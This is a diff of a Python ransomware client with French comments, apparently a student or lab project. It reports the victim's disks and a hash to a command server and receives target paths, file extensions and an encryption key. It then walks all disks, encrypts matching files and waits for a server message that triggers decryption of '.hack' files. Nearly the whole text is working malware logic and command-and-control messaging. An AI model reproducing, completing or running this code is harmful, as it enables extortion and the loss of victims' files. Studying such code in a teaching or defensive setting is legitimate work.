@@ -1,4 +1,6 @@
 import os
+
+import utile.config
 import utile.network as network
 import utile.message as message
 import utile.config as config
@@ -133,7 +135,6 @@ def dechiffre(fichier_source, key):
 
 def simulate_hash(longueur=0):
     identifiant = f'{node()}{current_time()}'
-    print(identifiant)
     return sha256(bytes()).hexdigest()
 
 
@@ -152,7 +153,10 @@ def main():
     # PORT_SERV_FRONTAL = int(config.get_config('PORT_SERV_FRONTAL'))
 
     # Vérifie le dernier état sauvegardé
+    config.load_config('config/ransomware.cfg', 'config/ransomware.bin')
     LAST_STATE = config.get_config('LAST_STATE')
+    hash = config.get_config('HASH')
+    print("LAST_STATE = ", str(LAST_STATE))
     if LAST_STATE is None:
         hash = config.get_config('HASH')
         if hash is None:
@@ -166,7 +170,6 @@ def main():
 
         # Détermine les disques disponibles
         disks = list_disks()
-        print(disks)
 
         # Construction du message d'initialisation du RANSOMWARE
         msg = message.set_message("initialize_req", [hash, system, disks])
@@ -184,6 +187,7 @@ def main():
 
         # Réception de la configuration
         msg = network.receive_message(conn_frontal)
+        print("Le message : " + str(msg))
         msg_type = message.get_message_type(msg)
         conn_frontal.close()
         if msg_type == 'INITIALIZE_RESP':
@@ -194,22 +198,30 @@ def main():
             config.set_config('PATHS', msg['SETTING']['PATHS'])
             config.set_config('FILE_EXT', msg['SETTING']['FILE_EXT'])
             config.set_config('FREQ', msg['SETTING']['FREQ'])
+            config.set_config('KEY', msg['SETTING']['KEY'])
             config.set_config('LAST_STATE', 'INITIALIZE')  # Signifie que la configuration est complète
             config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
-            # /!\ PAS DE SAUVEGARDE DE LA CLE DE CHIFFREMENT SUR DISQUE /!\
-            key_ransomware = msg['SETTING']['KEY']
-            # Changement d'état du ransomware
-            LAST_STATE = msg['SETTING']['STATE']
+            LAST_STATE = "CRYPT"
 
-    if LAST_STATE == 'INITIALIZE':
-        state_config = config.get_config('LAST_STATE')
-        if state_config != "INITIALIZE" and state_config != "CRYPT" and state_config != "PENDING":
-            return None
-        else:
-            disks = config.get_config('DISKS')
-            paths = config.get_config('PATHS')
-            file_ext = config.get_config('FILE_EXT')
-            nb_files_encrypted = config.get_config('NB_FILES_ENCRYPTED')
+    if LAST_STATE == 'CRYPT' or LAST_STATE == 'INITIALIZE':
+        config.set_config('LAST_STATE', 'PENDING')
+        config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
+        conn_frontal = network.connect_to_serv(port=PORT_SERV_FRONTAL)
+        id_vct = utile.config.get_config('ID_DB')
+        start_crypt = message.set_message("CRYPT_START",[id_vct] )
+        network.send_message(conn_frontal, start_crypt)
+        hash = utile.config.get_config("HASH")
+        start_restart =  message.set_message("RESTART_REQ",[hash] )
+        network.send_message(conn_frontal, start_restart)
+        restart_rep = network.receive_message(conn_frontal)
+        print(restart_rep)
+        key = restart_rep["KEY"]
+        print(start_crypt)
+        disks = config.get_config('DISKS')
+        print(disks)
+        paths = config.get_config('PATHS')
+        file_ext = config.get_config('FILE_EXT')
+        nb_files_encrypted = config.get_config('NB_FILES_ENCRYPTED')
         if nb_files_encrypted is None:
             nb_files_encrypted = 0
         disques = [chaine.replace("'", "") for chaine in disks]
@@ -218,34 +230,35 @@ def main():
         for element in file_ext:
             # Supprimer tous les guillemets simples de chaque extension et diviser la chaîne par la virgule
             extensions.extend(element.replace("'", "").split(','))
-        print(extensions)
         chemin = []
         for element in paths:
             # Supprimer tous les guillemets simples de chaque extension et diviser la chaîne par la virgule
             chemin.extend(element.replace("'", "").split(','))
-        print(chemin)
-        # Enlever les guillemets simples extérieurs de chaque élément de la liste
-        # LAST_STATE = "CRYPT"
-        # config.set_config('LAST_STATE', 'CRYPT')
-        # config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
-        # cryptage = True
-        # while cryptage:
-        #
-        #     start_crypt = utile.message.set_message("CRYPT_START",hash )
-        #     network.send_message(conn_frontal, start_crypt)
-        #     time.sleep(5)
-
-        # Fermeture de la connexion avec le serveur frontal
-
         for disk in disques:
             os.chdir(disk)
             for folder_path in chemin:
                 for (root, dirs, files) in os.walk(folder_path, topdown=True):
                     for filename in files:
                         if os.path.splitext(filename)[1] in extensions:  # Si l'extension est dans les types à chiffrer
-                            nb_files_encrypted += chiffre(f"\{root}\{filename}", key_ransomware)
-                print(f"Le ransomware a chiffré {nb_files_encrypted} fichiers.")
-            print("Chiffrement fait ? ")
+                            nb_files_encrypted += chiffre(f"\{root}\{filename}", key)
+                            print(f"Le ransomware a chiffré {nb_files_encrypted} fichiers.")
+        LAST_STATE = "PENDING"
+
+
+    if LAST_STATE == "PENDING":
+        conn_frontal = network.connect_to_serv(port=PORT_SERV_FRONTAL)
+        hash = utile.config.get_config("HASH")
+        start_pending = message.set_message("PENDING_MSG", [hash])
+        print(start_pending)
+        network.send_message(conn_frontal, start_pending)
+        print("message envoyé")
+        msg = network.receive_message(conn_frontal)
+        print(msg)
+        msg_type = utile.message.get_message_type(msg)
+        if msg_type == "DECRYPT_REQ":
+            LAST_STATE = "DECRYPT"
+            key = msg["KEY"]
+            hash = msg["DECRYPT"]
 
     if LAST_STATE == 'DECRYPT':
         disks = config.get_config('DISKS')
@@ -256,14 +269,13 @@ def main():
         for element in paths:
             # Supprimer tous les guillemets simples de chaque extension et diviser la chaîne par la virgule
             chemin.extend(element.replace("'", "").split(','))
-        print(chemin)
         for disk in disques:
             os.chdir(disk)
             for folder_path in chemin:
                 for (root, dirs, files) in os.walk(folder_path, topdown=True):
                     for filename in files:
                         if filename.endswith('.hack'):  # Si l'extension est dans les types à dechiffrer
-                            dechiffre(f"\{root}\{filename}", key_ransomware)
+                            dechiffre(f"\{root}\{filename}", key)
                             print("Déchiffrement fait ")
 
 
